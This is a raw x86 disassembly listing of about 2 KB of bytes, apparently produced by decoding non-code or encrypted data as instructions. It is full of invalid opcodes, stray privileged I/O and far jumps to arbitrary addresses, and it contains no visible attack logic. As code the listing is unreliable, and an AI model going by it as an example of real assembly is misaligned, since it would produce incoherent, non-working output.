  4101a0:	xor    al,0x6e
  4101a2:	out    0xe6,al
  4101a4:	cmp    al,0x14
  4101a6:	loop   0x410193
  4101a8:	add    edi,edi
  4101aa:	mov    bl,0x42
  4101ac:	dec    cx
  4101ae:	into   
  4101af:	push   edx
  4101b0:	adc    ebp,DWORD PTR [esi+0x76]
  4101b3:	or     edi,ebx
  4101b5:	fadd   DWORD PTR [esi]
  4101b7:	mov    ebx,0x87f90896
  4101bc:	mov    DWORD PTR [esi],ecx
  4101be:	jno    0x410154
  4101c0:	leave  
  4101c1:	aam    0x79
  4101c3:	lea    ebp,[edi-0x504dc69e]
  4101c9:	dec    edi
  4101ca:	lea    eax,[edi+0x4e]
  4101cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101ce:	fsub   st,st(3)
  4101d0:	push   edi
  4101d1:	and    al,BYTE PTR [eax+0x7c]
  4101d4:	mov    dl,BYTE PTR [ebp-0x75]
  4101d7:	fsincos 
  4101d9:	stc    
  4101da:	(bad)  
  4101db:	cmp    eax,0x77a36717
  4101e0:	jno    0x41016a
  4101e2:	or     DWORD PTR [edx-0x47],ebx
  4101e5:	(bad)  
  4101e6:	test   al,0x2a
  4101e8:	mov    ebx,0xd2496afd
  4101ed:	data16 mov bl,0xfe
  4101f0:	xchg   ebp,eax
  4101f1:	xchg   edi,eax
  4101f2:	enter  0x13fc,0xb6
  4101f6:	sahf   
  4101f7:	inc    esp
  4101f8:	push   es
  4101f9:	cmp    ebx,DWORD PTR [ebp+0x3f]
  4101fc:	push   eax
  4101fd:	add    DWORD PTR [ebx+0x14],esi
  410200:	popf   
  410201:	mov    dh,0xc0
  410203:	inc    ecx
  410204:	lock ror esi,cl
  410207:	pop    ds
  410208:	rcl    DWORD PTR [edi-0x6e],cl
  41020b:	xor    edx,DWORD PTR [edi]
  41020d:	adc    bl,cl
  41020f:	stos   DWORD PTR es:[edi],eax
  410210:	mov    cl,0x11
  410212:	aaa    
  410213:	adc    eax,0x12ad9f35
  410218:	int3   
  410219:	retf   0x5590
  41021c:	jle    0x410240
  41021e:	stos   DWORD PTR es:[edi],eax
  41021f:	test   al,0x10
  410221:	adc    al,0x8a
  410223:	sbb    dl,BYTE PTR [ebp+0x302c9bf9]
  410229:	icebp  
  41022a:	cmp    bh,ch
  41022c:	mov    esi,0xb5950f7d
  410231:	faddp  st(4),st
  410233:	fsubr  QWORD PTR [eax+0x4f]
  410236:	cmc    
  410237:	mov    ebx,DWORD PTR [ebx+0x2a]
  41023a:	mov    ebx,0xdee737bf
  41023f:	and    eax,0x6b15f224
  410244:	arpl   WORD PTR [ecx+0x1d],si
  410247:	in     al,dx
  410248:	mov    ch,0x96
  41024a:	fild   DWORD PTR [ecx+ebx*2+0x73]
  41024e:	test   BYTE PTR gs:[edi-0x1b],bh
  410252:	inc    edi
  410253:	shl    DWORD PTR [esi-0x7dbb53b9],0x38
  41025a:	std    
  41025b:	jbe    0x41026d
  41025d:	loopne 0x410214
  41025f:	xor    bh,ch
  410261:	outs   dx,BYTE PTR ds:[esi]
  410262:	call   0xcc22:0x7f9e65fe
  410269:	lock jg 0x4101fd
  41026c:	mul    BYTE PTR [eax+0x1b]
  41026f:	jo     0x410216
  410271:	add    eax,0xf51f3e37
  410276:	jmp    0x4102b5
  410278:	ret    0xaaf
  41027b:	xchg   ah,cl
  41027d:	adc    bl,BYTE PTR [eax-0x2f]
  410280:	out    dx,al
  410281:	std    
  410282:	jb     0x4102ac
  410284:	mov    bl,0x7a
  410286:	mov    ch,0xb8
  410288:	xchg   ebp,eax
  410289:	xchg   ebx,eax
  41028a:	mov    bl,0x5
  41028c:	sahf   
  41028d:	adc    al,0x7a
  41028f:	mov    DWORD PTR [eax-0x45],ebx
  410292:	dec    esi
  410293:	mov    edi,0xcd512b86
  410298:	(bad)  
  410299:	push   ebp
  41029a:	repnz push ebx
  41029c:	pop    edi
  41029d:	mov    ds:0x7891f100,eax
  4102a2:	or     eax,0xea579bca
  4102a7:	(bad)  
  4102a8:	(bad)  
  4102a9:	mov    edi,0x4b02924d
  4102ae:	jge    0x4102eb
  4102b0:	and    bh,BYTE PTR [ebp+0x23e0ad7f]
  4102b6:	mov    eax,0x1c37833a
  4102bb:	sbb    BYTE PTR [eax],bh
  4102bd:	mov    cl,0xf5
  4102bf:	cwde   
  4102c0:	push   esp
  4102c1:	xor    ebp,DWORD PTR [ecx+0x12]
  4102c4:	push   es
  4102c5:	mov    ds:0x3f1d32da,eax
  4102ca:	mov    ecx,DWORD PTR [eax+eiz*1+0x104c45f7]
  4102d1:	jecxz  0x410302
  4102d3:	mov    ah,0x34
  4102d5:	icebp  
  4102d6:	(bad)  
  4102d7:	arpl   ax,bx
  4102d9:	int    0x61
  4102db:	lds    esi,FWORD PTR [ebx]
  4102dd:	bound  edx,QWORD PTR [eax-0x6f]
  4102e0:	hlt    
  4102e1:	sahf   
  4102e2:	cli    
  4102e3:	lock adc al,0x8
  4102e6:	sub    al,0xc2
  4102e8:	je     0x410320
  4102ea:	inc    esp
  4102eb:	dec    edx
  4102ec:	and    DWORD PTR [edi+0xd],0xffffff9d
  4102f0:	les    ebp,FWORD PTR [ebx]
  4102f2:	jnp    0x410347
  4102f4:	mov    dl,0x98
  4102f6:	adc    ebx,ecx
  4102f8:	mov    ds:0x808e03d7,eax
  4102fd:	mov    al,ds:0xc6f43195
  410302:	add    BYTE PTR [ecx-0x3e],cl
  410305:	fild   WORD PTR [esp+ecx*8-0x57]
  410309:	mov    BYTE PTR [edx],dl
  41030b:	mov    edi,0xf12bde67
  410310:	cmp    ebp,DWORD PTR [edi-0x625bdbb9]
  410316:	ds push ebp
  410318:	add    dh,BYTE PTR [ecx+0x51]
  41031b:	shr    DWORD PTR [ebx],0x17
  41031e:	fsub   QWORD PTR [ebp+0x73]
  410321:	fnstenv [ebx-0x18b3359f]
  410327:	xchg   ecx,eax
  410328:	sub    DWORD PTR [ebx+0x56],ebx
  41032b:	sbb    al,0x79
  41032d:	ins    DWORD PTR es:[edi],dx
  41032e:	mov    cl,0x0
  410330:	fnstsw WORD PTR [esi-0x6e57ea1]
  410336:	rol    DWORD PTR [edi],0x58
  410339:	shl    DWORD PTR [eax-0x41],0x19
  41033d:	jnp    0x41034e
  41033f:	xlat   BYTE PTR ds:[ebx]
  410340:	lock aad 0xba
  410343:	shr    dl,0xc1
  410346:	push   edi
  410347:	test   eax,0x8bc332b4
  41034c:	adc    al,0x30
  41034e:	outs   dx,DWORD PTR ds:[esi]
  41034f:	jae    0x41038a
  410351:	loope  0x410308
  410353:	les    ebp,FWORD PTR [ebx]
  410355:	pushf  
  410356:	xchg   DWORD PTR [esi+0x5],ebx
  410359:	cdq    
  41035a:	fcom   st(7)
  41035c:	jo     0x410362
  41035e:	es (bad) 
  410360:	xchg   ecx,eax
  410361:	pop    edi
  410362:	mov    ah,0x41
  410364:	sbb    edx,ebx
  410366:	je     0x4103c0
  410368:	lods   al,BYTE PTR ds:[esi]
  410369:	bound  edx,QWORD PTR [edx]
  41036b:	inc    edi
  41036c:	adc    esi,DWORD PTR [eax+0x6]
  41036f:	xchg   ebp,eax
  410370:	jg     0x410337
  410372:	jne    0x410349
  410374:	std    
  410375:	pop    ebp
  410376:	xor    al,0xb3
  410378:	push   esp
  410379:	data16 xchg BYTE PTR [edi+edx*8],ch
  41037d:	sub    al,BYTE PTR ds:0x1ecc3656
  410383:	cwde   
  410384:	into   
  410385:	rcl    ah,1
  410387:	or     al,0xbd
  410389:	aam    0x3f
  41038b:	push   edi
  41038c:	inc    esp
  41038d:	pop    ds
  41038e:	dec    esi
  41038f:	xchg   ebp,eax
  410390:	jns    0x410339
  410392:	aad    0x80
  410394:	pop    ebp
  410395:	in     al,0x59
  410397:	sub    edi,DWORD PTR [esi-0x53]
  41039a:	push   eax
  41039b:	push   dx
  41039d:	idiv   al
  41039f:	and    BYTE PTR [ebx-0x468bde4f],bl
  4103a5:	arpl   WORD PTR [edx*8-0x7fa4e893],sp
  4103ac:	jbe    0x4103de
  4103ae:	ficom  WORD PTR [esi+0x47ac3623]
  4103b4:	pop    edi
  4103b5:	sub    DWORD PTR [eax-0x56],ecx
  4103b8:	std    
  4103b9:	add    eax,0xe9257cc7
  4103be:	cmp    al,0xc0
  4103c0:	pop    edx
  4103c1:	inc    edx
  4103c2:	mov    eax,0x38c79d30
  4103c7:	(bad)  
  4103c8:	ins    BYTE PTR es:[edi],dx
  4103c9:	retf   
  4103ca:	cmc    
  4103cb:	adc    DWORD PTR [ebx+0x6360988],edi
  4103d1:	or     dh,bl
  4103d3:	enter  0x69e8,0x27
  4103d7:	fld    TBYTE PTR [ebx+ecx*1+0x1f0bb13d]
  4103de:	mov    ch,0xa3
  4103e0:	outs   dx,DWORD PTR ds:[esi]
  4103e1:	pop    edi
  4103e2:	mov    ch,0x52
  4103e4:	xor    al,0x72
  4103e6:	fs inc eax
  4103e8:	out    dx,al
  4103e9:	test   DWORD PTR [ecx+eiz*1+0x4c],esp
  4103ed:	xor    edi,ebx
  4103ef:	pushf  
  4103f0:	jge    0x4103ca
  4103f2:	in     eax,0xd5
  4103f4:	sbb    al,BYTE PTR [esi-0x24949ba9]
  4103fa:	sub    ebp,DWORD PTR [edx-0x7b]
  4103fd:	lods   al,BYTE PTR ds:[esi]
  4103fe:	or     esi,DWORD PTR [ecx-0x1fa7f68b]
  410404:	add    al,0xc8
  410406:	loop   0x4103a9
  410408:	inc    esp
  410409:	jns    0x4103d0
  41040b:	push   0x198bf51b
  410410:	and    eax,0x30479a69
  410415:	aas    
  410416:	xchg   DWORD PTR [esi-0x4b],esp
  410419:	push   esi
  41041a:	in     eax,0xa
  41041c:	cld    
  41041d:	sub    edi,DWORD PTR [edi+edi*4+0x4ad30cf]
  410424:	mov    bl,0x3f
  410426:	(bad)  
  410427:	dec    ebx
  410428:	js     0x410468
  41042a:	mov    cl,0xa
  41042c:	mov    DWORD PTR [edi-0x66d75eec],edx
  410432:	test   DWORD PTR [ebp-0x4a],0xc9c8a2c3
  410439:	push   ds
  41043a:	cwde   
  41043b:	xor    dh,bh
  41043d:	jmp    0x410404
  41043f:	and    DWORD PTR [edx+ebx*2-0x59555146],edx
  410446:	iret   
  410447:	add    BYTE PTR [edx],ah
  410449:	loopne 0x410444
  41044b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41044d:	mul    BYTE PTR [edi]
  41044f:	and    dh,BYTE PTR [edx-0x4]
  410452:	test   BYTE PTR [eax-0x45738f6],0x59
  410459:	mov    esi,0x903f9ce6
  41045e:	adc    al,0x7f
  410461:	lea    ebp,[ebx-0x25]
  410464:	stos   BYTE PTR es:[edi],al
  410465:	sub    edi,ebp
  410467:	mov    eax,ds:0xb60ae8de
  41046c:	and    ah,bh
  41046e:	xor    eax,0xe579d21b
  410473:	dec    edi
  410474:	jmp    0xbbe33bef
  410479:	push   edx
  41047a:	int3   
  41047b:	test   BYTE PTR [edi],ch
  41047d:	out    0x7b,eax
  41047f:	dec    ebp
  410480:	or     BYTE PTR [ebx],bh
  410482:	xchg   edx,eax
  410483:	xor    ch,ch
  410485:	cwde   
  410486:	cdq    
  410487:	das    
  410488:	mov    ss,WORD PTR [edi+0x54]
  41048b:	std    
  41048c:	ss call 0x3f8b:0x7cd29f3d
  410494:	pop    ebp
  410495:	cmc    
  410496:	test   al,0x93
  410498:	loop   0x4104a9
  41049a:	push   ebp
  41049b:	dec    esp
  41049c:	ret    0xbd74
  41049f:	xchg   esi,eax
  4104a0:	stos   BYTE PTR es:[edi],al
  4104a1:	ja     0x41047b
  4104a3:	call   0x6a12ac94
  4104a8:	outs   dx,DWORD PTR ds:[esi]
  4104a9:	or     DWORD PTR [ebx],0x590e35e5
  4104af:	stos   DWORD PTR es:[edi],eax
  4104b0:	inc    ebp
  4104b1:	imul   edi,DWORD PTR [edi+0x22750414],0x282e97f6
  4104bb:	jp     0x4104d9
  4104bd:	and    BYTE PTR [edi+ebp*4+0x76b6e0d2],dl
  4104c4:	(bad)  
  4104c5:	hlt    
  4104c6:	mov    edx,DWORD PTR [edi+0x19972083]
  4104cc:	lock xchg DWORD PTR [edx-0x41c628fe],esi
  4104d3:	jnp    0x41048c
  4104d5:	(bad)  
  4104d6:	add    al,0xef
  4104d8:	das    
  4104d9:	cmp    cl,BYTE PTR [ecx+eiz*2+0x59]
  4104dd:	and    esi,DWORD PTR [ecx+0x76]
  4104e0:	ja     0x4104e0
  4104e2:	mov    ds:0xb9d69,al
  4104e7:	push   edx
  4104e8:	mov    DWORD PTR gs:[eax+0x71],ebp
  4104ec:	ret    
  4104ed:	mov    dh,0xbb
  4104ef:	inc    esi
  4104f0:	mov    al,ds:0x1de976e0
  4104f5:	jne    0x41056d
  4104f7:	mov    ah,0x43
  4104f9:	mov    eax,0xe2f59430
  4104fe:	mov    bh,0x47
  410500:	les    esi,FWORD PTR ds:0xa3bc9186
  410506:	pop    esp
  410507:	in     al,dx
  410508:	pushf  
  410509:	bound  esi,QWORD PTR [ebx+0x47]
  41050c:	test   WORD PTR [ebx],cx
  41050f:	dec    esp
  410510:	or     edi,DWORD PTR [esp+edx*4-0x12a5e3e6]
  410517:	mov    DWORD PTR [esi*2-0x52d1b89a],edi
  41051e:	icebp  
  41051f:	ret    0xa7a2
  410522:	adc    ah,BYTE PTR [ebp+0x47afad03]
  410528:	in     eax,dx
  410529:	test   DWORD PTR [ebx+0x17],0xe8fd64cd
  410530:	sub    DWORD PTR [edi+eax*4+0xb],edx
  410534:	adc    eax,0xd8feb39d
  410539:	cmp    BYTE PTR [esi-0x6],0xf4
  41053d:	pop    ds
  41053e:	ds in  al,0x24
  410541:	lods   eax,DWORD PTR ds:[esi]
  410542:	sahf   
  410543:	adc    esi,ecx
  410545:	out    dx,eax
  410546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410547:	xor    DWORD PTR [esi],ebp
  410549:	stos   DWORD PTR es:[edi],eax
  41054a:	nop
  41054b:	outs   dx,BYTE PTR ds:[esi]
  41054c:	lods   al,BYTE PTR ds:[esi]
  41054d:	int    0x8f
  41054f:	cmp    al,0xca
  410551:	cld    
  410552:	call   0x39f4:0x83bfc323
  410559:	xor    ebx,eax
  41055b:	test   eax,0x7e82ad2b
  410560:	in     eax,0x55
  410562:	bound  ecx,QWORD PTR [edi-0x11]
  410565:	sahf   
  410566:	mov    cl,0x40
  410568:	cmp    bl,bh
  41056a:	cmp    dh,BYTE PTR [ebx]
  41056c:	fidiv  DWORD PTR [ebx]
  41056e:	shl    DWORD PTR [eax-0x47fea47],0x19
  410575:	ins    DWORD PTR es:[edi],dx
  410576:	std    
  410577:	pop    ecx
  410578:	sub    BYTE PTR [esi+ebx*8],dh
  41057b:	nop
  41057c:	and    al,0x6e
  41057e:	mov    al,0xcb
  410580:	ins    BYTE PTR es:[edi],dx
  410581:	xchg   ch,bh
  410583:	in     al,dx
  410584:	sar    ebp,1
  410586:	xchg   BYTE PTR [ecx],dh
  410588:	push   0xffffffeb
  41058a:	(bad)  
  41058b:	addr16 ffreep st(5)
  41058e:	daa    
  41058f:	sbb    BYTE PTR [ecx-0x65677a76],al
  410595:	xor    BYTE PTR [eax+0x673aef1c],bh
  41059b:	xchg   esp,eax
  41059c:	mov    ds:0xfd4eb561,al
  4105a1:	frstor [ebx-0xe]
  4105a4:	jp     0x410610
  4105a6:	dec    eax
  4105a7:	mov    edx,0x77d02df2
  4105ac:	(bad)  
  4105ad:	push   0x75
  4105af:	pop    edi
  4105b0:	test   eax,0x9cddfa02
  4105b5:	pushf  
  4105b6:	and    BYTE PTR [ecx],ch
  4105b8:	fucomp st(4)
  4105ba:	mov    edi,0xa3c6da3f
  4105bf:	adc    ah,BYTE PTR [ebx]
  4105c1:	add    edi,edi
  4105c3:	ds push eax
  4105c5:	push   esi
  4105c6:	pop    esi
  4105c7:	cmp    cl,BYTE PTR [eax-0x598ad620]
  4105cd:	fdivr  DWORD PTR [esi-0x10]
  4105d0:	fisttp QWORD PTR [eax-0x36c550a3]
  4105d6:	in     al,0xd
  4105d8:	dec    eax
  4105d9:	aad    0x23
  4105db:	pop    edi
  4105dc:	shl    edi,1
  4105de:	adc    ah,BYTE PTR [esi+0x59]
  4105e1:	push   ss
  4105e2:	and    DWORD PTR [edi+esi*1-0x46c1f656],0xf16a19e7
  4105ed:	shl    DWORD PTR [esi+0x4f],0x2a
  4105f1:	fucomp st(6)
  4105f3:	jp     0x410583
  4105f5:	fs nop
  4105f7:	and    al,0xb3
  4105f9:	add    al,0x29
  4105fb:	jnp    0x41057d
  4105fd:	iret   
  4105fe:	push   ebx
  4105ff:	mov    al,0x9d
  410601:	enter  0xf444,0x39
  410605:	inc    edx
  410606:	dec    eax
  410607:	xor    eax,0x1eeec4f
  41060c:	mov    dl,0x39
  41060e:	and    al,dh
  410610:	sub    ah,dl
  410612:	outs   dx,DWORD PTR ds:[esi]
  410613:	enter  0x179b,0x20
  410617:	sbb    ah,BYTE PTR [edx]
  410619:	mov    dh,0x43
  41061b:	push   edi
  41061c:	inc    edx
  41061d:	cmc    
  41061e:	adc    ebp,DWORD PTR [ebx-0x2]
  410621:	cs pop edx
  410623:	cmp    ebp,DWORD PTR ds:0xc245215c
  410629:	add    ecx,DWORD PTR [ecx+0x2555285a]
  41062f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410630:	add    esp,esi
  410632:	and    cl,BYTE PTR [ebx+0x47]
  410635:	mov    eax,ds:0x9da9c52e
  41063a:	retf   
  41063b:	fcomi  st,st(3)
  41063d:	dec    ecx
  41063e:	xchg   esi,eax
  41063f:	and    eax,0x16d3c247
  410644:	push   ecx
  410645:	ficomp WORD PTR [ebx]
  410647:	test   DWORD PTR ds:0xc3b498dc,0x32520e1a
  410651:	jl     0x410644
  410653:	lahf   
  410654:	out    dx,al
  410655:	popa   
  410656:	push   0xffffffd5
  410658:	jae    0x410613
  41065a:	mov    bh,0x0
  41065c:	pop    ecx
  41065d:	in     eax,0xbf
  41065f:	mov    ebp,0x18b88dc8
  410664:	call   0xe22db96f
  410669:	pusha  
  41066a:	int    0xdf
  41066c:	es mov bh,0xf7
  41066f:	mov    ah,0xe2
  410671:	inc    eax
  410672:	dec    edx
  410673:	inc    edx
  410674:	sub    BYTE PTR [ebx],ah
  410676:	test   BYTE PTR ss:[esi],cl
  410679:	add    eax,0x5a987ada
  41067e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41067f:	lahf   
  410680:	mov    ebp,0x4fba4a8b
  410685:	jmp    0x4761:0x9ec00399
  41068c:	jno    0x410638
  41068e:	inc    esi
  41068f:	jbe    0x4106ea
  410691:	(bad)  
  410692:	fst    QWORD PTR [ecx-0x80]
  410695:	push   edx
  410696:	add    ecx,DWORD PTR [edi]
  410698:	inc    ecx
  410699:	xchg   edi,eax
  41069a:	popf   
  41069b:	mov    al,ss:0x724f5c28
  4106a1:	mov    esp,0xc7f1ea80
  4106a6:	repz iret 
  4106a8:	inc    edi
  4106a9:	sub    al,0xf5
  4106ab:	jecxz  0x41063d
  4106ad:	push   ebx
  4106ae:	je     0x41069b
  4106b0:	arpl   WORD PTR [ebp-0x3d3db0bd],dx
  4106b6:	push   es
  4106b7:	int    0x65
  4106b9:	push   ss
  4106ba:	inc    ecx
  4106bb:	arpl   di,sp
  4106bd:	pop    esp
  4106be:	pop    ebx
  4106bf:	pushf  
  4106c0:	imul   eax,DWORD PTR [ebp-0x54abd258],0x3be82a51
  4106ca:	dec    BYTE PTR [edi+0x169d8f05]
  4106d0:	xor    al,0x20
  4106d2:	pop    ds
  4106d3:	pop    ecx
  4106d4:	sbb    ebp,DWORD PTR [edi]
  4106d6:	jge    0x410658
  4106d8:	add    BYTE PTR [eiz*4-0x5088219b],bh
  4106df:	push   ebx
  4106e0:	hlt    
  4106e1:	rol    DWORD PTR [edi-0x3f112f47],cl
  4106e7:	gs popa 
  4106e9:	adc    DWORD PTR [esi],ebx
  4106eb:	sbb    esi,DWORD PTR [ebp-0x27]
  4106ee:	jno    0x41068a
  4106f0:	pop    esp
  4106f1:	rol    BYTE PTR [eax],0xff
  4106f4:	scas   eax,DWORD PTR es:[edi]
  4106f5:	and    eax,0xa3aa59d6
  4106fa:	cli    
  4106fb:	dec    esp
  4106fc:	sub    BYTE PTR [ebx+0x1ed342f8],bh
  410702:	push   edx
  410703:	or     BYTE PTR [esi],dl
  410705:	imul   ebx,DWORD PTR [ecx],0x18623d9b
  41070b:	mov    ?,eax
  41070d:	and    BYTE PTR es:[edi],ch
  410710:	shr    BYTE PTR [eax],1
  410712:	push   ds
  410713:	enter  0x4bfd,0xb3
  410717:	int    0x2b
  410719:	inc    eax
  41071a:	loopne 0x410766
  41071c:	in     eax,0xa3
  41071e:	imul   esi,DWORD PTR [ebp-0x27deab03],0xfffffff6
  410725:	push   ebx
  410726:	or     ah,ch
  410728:	push   edx
  410729:	pop    es
  41072a:	mov    ebp,0x70465bd5
  41072f:	aad    0x60
  410731:	call   0x14ae:0xa84cec61
  410738:	nop
  410739:	or     al,0xa8
  41073b:	xlat   BYTE PTR ds:[ebx]
  41073c:	lods   al,BYTE PTR ds:[esi]
  41073d:	daa    
  41073e:	in     al,dx
  41073f:	inc    esp
  410740:	retf   
  410741:	inc    ecx
  410742:	into   
  410743:	ins    DWORD PTR es:[edi],dx
  410744:	pop    eax
  410745:	loopne 0x4106e7
  410747:	fdivr  DWORD PTR [eax-0x4]
  41074a:	xor    ebx,DWORD PTR [eax]
  41074c:	fldcw  WORD PTR [eax]
  41074e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41074f:	cdq    
  410750:	jmp    esi
  410752:	fisttp DWORD PTR [ecx+0x13bbeed7]
  410758:	sbb    BYTE PTR [edi-0x17],dh
  41075b:	fwait
  41075c:	pushf  
  41075d:	je     0x4107d6
  41075f:	(bad)  [edx]
  410761:	ror    DWORD PTR [edx-0x19],1
  410764:	jo     0x410721
  410766:	mov    bh,0xf7
  410768:	daa    
  410769:	popa   
  41076a:	test   al,0x68
  41076c:	and    DWORD PTR ds:0xd5e1f549,edi
  410772:	xor    bh,BYTE PTR [ebx]
  410774:	lds    edi,FWORD PTR [eax]
  410776:	imul   edx,eax,0xffffffd2
  410779:	data16 stc 
  41077b:	cli    
  41077c:	or     DWORD PTR [ebx+0x4a],ebp
  41077f:	in     eax,0x62
  410781:	rcr    BYTE PTR ss:[esi+0x4a],1
  410785:	ret    
  410786:	shl    BYTE PTR ds:0x33aa0a8c,0xac
  41078d:	pop    es
  41078e:	jecxz  0x410791
  410790:	add    ecx,eax
  410792:	push   ebx
  410793:	mov    esp,0xdb008ab6
  410798:	out    dx,eax
  410799:	cs add bh,cl
  41079c:	push   ss
  41079d:	imul   eax,DWORD PTR [ebp+0x7f],0x792d0263
  4107a4:	pop    edi
  4107a5:	adc    DWORD PTR [eax+0x7dc69f42],edi
  4107ab:	add    edi,DWORD PTR [edx-0x40135279]
  4107b1:	fld    st(4)
  4107b3:	retf   0xdc36
  4107b6:	jp     0x5f0fde4f
  4107bc:	aas    
  4107bd:	fcomi  st,st(2)
  4107bf:	dec    esi
  4107c0:	aaa    
  4107c1:	jp     0x4107e5
  4107c3:	and    ch,ch
  4107c5:	jge    0x4107cf
  4107c7:	mov    bl,0xd8
  4107c9:	pop    ss
  4107ca:	jmp    0xb9a7f18b
  4107cf:	mov    bl,0xff
  4107d1:	aad    0x37
  4107d3:	and    al,0x11
  4107d5:	test   eax,0xb4d875d9
  4107da:	les    ecx,FWORD PTR [ebx-0x5e]
  4107dd:	imul   esp,DWORD PTR [eax-0x1f84ca86],0x718a0389
  4107e7:	cdq    
  4107e8:	push   ebx
  4107e9:	mov    ds:0xa5947665,al
  4107ee:	rdpmc  
  4107f0:	inc    edi
  4107f1:	std    
  4107f2:	pushf  
  4107f3:	xor    BYTE PTR [ebx],0x8
  4107f6:	jmp    ebp
  4107f8:	add    DWORD PTR [ecx+ebx*8-0x5338499b],esp
  4107ff:	push   ds
  410800:	enter  0xfdf,0x54
  410804:	sub    ebx,DWORD PTR [esp+eax*1+0x60fec69]
  41080b:	sbb    bl,dh
  41080d:	lea    esp,[eax-0x7ad80675]
  410813:	sub    ebx,edx
  410815:	xchg   edx,eax
  410816:	cmp    al,0xaa
  410818:	jmp    0x1304:0x8c10fdce
  41081f:	xor    al,BYTE PTR [ebx+0x1b]
  410822:	retf   
  410823:	fwait
  410824:	pop    ebx
  410825:	js     0x4107f7
  410827:	ins    BYTE PTR es:[edi],dx
  410828:	jle    0x4107e1
  41082a:	test   eax,0xea18931e
  41082f:	mov    ds:0x55d51b6f,al
  410834:	cwde   
  410835:	push   ds
  410836:	imul   esi,DWORD PTR [eax],0xb44dd400
  41083c:	cld    
  41083d:	pop    ss
  41083e:	iret   
  41083f:	pop    edx
  410840:	lock cmp ebx,eax
  410843:	fidivr DWORD PTR [edx-0x52]
  410846:	xlat   BYTE PTR ds:[ebx]
  410847:	dec    ecx
  410848:	addr16 push ds
  41084a:	gs mov al,0xfc
  41084d:	int3   
  41084e:	xchg   esp,eax
  41084f:	test   eax,0x42e80267
  410854:	sbb    eax,0x9a976e81
  410859:	setge  BYTE PTR [ebx]
  41085c:	pop    edi
  41085d:	push   0x99dc30dc
  410862:	in     al,dx
  410863:	adc    eax,0x42c33cb9
  410868:	add    DWORD PTR gs:[ecx],esi
  41086b:	push   0x41
  41086d:	cmp    DWORD PTR [edx-0x7a],eax
  410870:	call   0xb5d8:0xa2c3ffb7
  410877:	ins    BYTE PTR es:[edi],dx
  410878:	mov    edx,0xbde6c455
  41087d:	and    ch,BYTE PTR [ebx+0x47]
  410880:	mov    ebp,0x40fefb96
  410885:	jbe    0x4108cb
  410887:	loopne 0x4108b4
  410889:	add    bl,dl
  41088b:	mov    gs,edx
  41088d:	gs cld 
  41088f:	pop    esp
  410890:	test   al,0xf5
  410892:	xchg   ebp,eax
  410893:	xchg   ecx,eax
  410894:	sub    DWORD PTR [edi+0x4a],esp
  410897:	and    ah,BYTE PTR ds:0xb5ad09b0
  41089d:	mov    BYTE PTR [esi+ecx*8],ah
  4108a0:	push   esi
  4108a1:	mov    dh,0xb
  4108a3:	dec    ecx
  4108a4:	and    esi,ebx
  4108a6:	jo     0x410909
  4108a8:	sbb    edi,0x71
  4108ab:	mov    WORD PTR [edi],?
  4108ad:	mov    ds:0x8c0334f8,eax
  4108b2:	mov    bl,BYTE PTR [ecx+0x7c]
  4108b5:	call   0x3fb6a372
  4108ba:	shr    BYTE PTR [eax-0x75],cl
  4108bd:	push   edx
  4108bf:	push   esi
  4108c0:	std    
  4108c1:	adc    BYTE PTR [edx+0x15],bl
  4108c4:	cmp    DWORD PTR [ebx-0x27],0xffffffbf
  4108c8:	in     eax,dx
  4108c9:	mov    bh,0xae
  4108cb:	ror    BYTE PTR [ebx-0x64],cl
  4108ce:	inc    esi
  4108cf:	ret    0xf069
  4108d2:	fadd   QWORD PTR ds:0xdd850594
  4108d8:	sbb    al,0xe
  4108da:	fs leave 
  4108dc:	xor    ecx,DWORD PTR [edx]
  4108de:	dec    edx
  4108df:	add    al,0x9e
  4108e1:	push   cs
  4108e2:	into   
  4108e3:	or     DWORD PTR [edi-0x24],esi
  4108e6:	fstp   DWORD PTR [ecx-0x630f9010]
  4108ec:	out    0x4,al
  4108ee:	out    dx,eax
  4108ef:	out    0xd9,al
  4108f1:	ds sub BYTE PTR gs:[eax-0x7],bh
  4108f6:	in     al,dx
  4108f7:	stos   BYTE PTR es:[edi],al
  4108f8:	mov    esi,0xdfe6165b
  4108fd:	xchg   esi,eax
  4108fe:	fsub   st(5),st
  410900:	xchg   DWORD PTR [ecx+0x5a46d5ba],esp
  410906:	xor    al,dh
  410908:	adc    DWORD PTR ds:0x1c5f7205,edx
  41090e:	retf   
  41090f:	and    dl,BYTE PTR gs:[edx-0x778a2048]
  410916:	inc    edx
  410917:	iret   
  410918:	mov    edi,0x9104e966
  41091d:	clc    
  41091e:	pop    esi
  41091f:	test   al,0xfe
  410921:	add    BYTE PTR [edx],0x4b
  410924:	shl    BYTE PTR [esi+0x6a],cl
  410927:	mov    ch,0xc0
  410929:	int3   
  41092a:	jmp    0xcb11:0xb840116
  410931:	es push 0xecc656ed
  410937:	nop
  410938:	dec    ecx
  410939:	jl     0x4108bd
  41093b:	ret    
  41093c:	lahf   
  41093d:	jb     0x410964
  41093f:	lods   al,BYTE PTR ds:[esi]
  410940:	xor    esp,DWORD PTR [ecx]
  410942:	jns    0x4108ed
  410944:	pop    edi
  410945:	push   edx
  410946:	sbb    al,0x96
  410948:	dec    ecx
  410949:	fcomp  DWORD PTR [ebx-0x507326ea]
  41094f:	sub    eax,0x9ec70d87
  410954:	jns    0x410919
  410956:	pop    ebp
  410957:	sub    al,0x7d
  410959:	repnz out dx,al
  41095b:	out    0x7a,eax
  41095d:	inc    edi
  41095e:	sub    DWORD PTR [ebx],ecx
  410960:	xchg   al,dl
  410962:	mov    edx,DWORD PTR ds:0x661a3ccc
  410968:	inc    esi
  410969:	(bad)  
  41096a:	call   0x698f7bdf
  41096f:	and    ebx,DWORD PTR [ebx+ecx*1+0xa]
  410973:	or     ecx,DWORD PTR [ebp+0x78919879]
  410979:	mov    ch,0xcc
  41097b:	mov    esp,0xdd93e42d
  410980:	popf   
  410981:	and    al,0x47
  410983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410984:	push   ebx
  410985:	dec    ebp
  410986:	jg     0x4109e5
  410988:	enter  0x7877,0xfa
  41098c:	call   0x5475c220
  410991:	sub    al,0xb6
  410993:	or     al,0x4b
  410995:	cmc    
  410996:	imul   edx,DWORD PTR [edi-0x21],0xffffffb2
  41099a:	icebp  
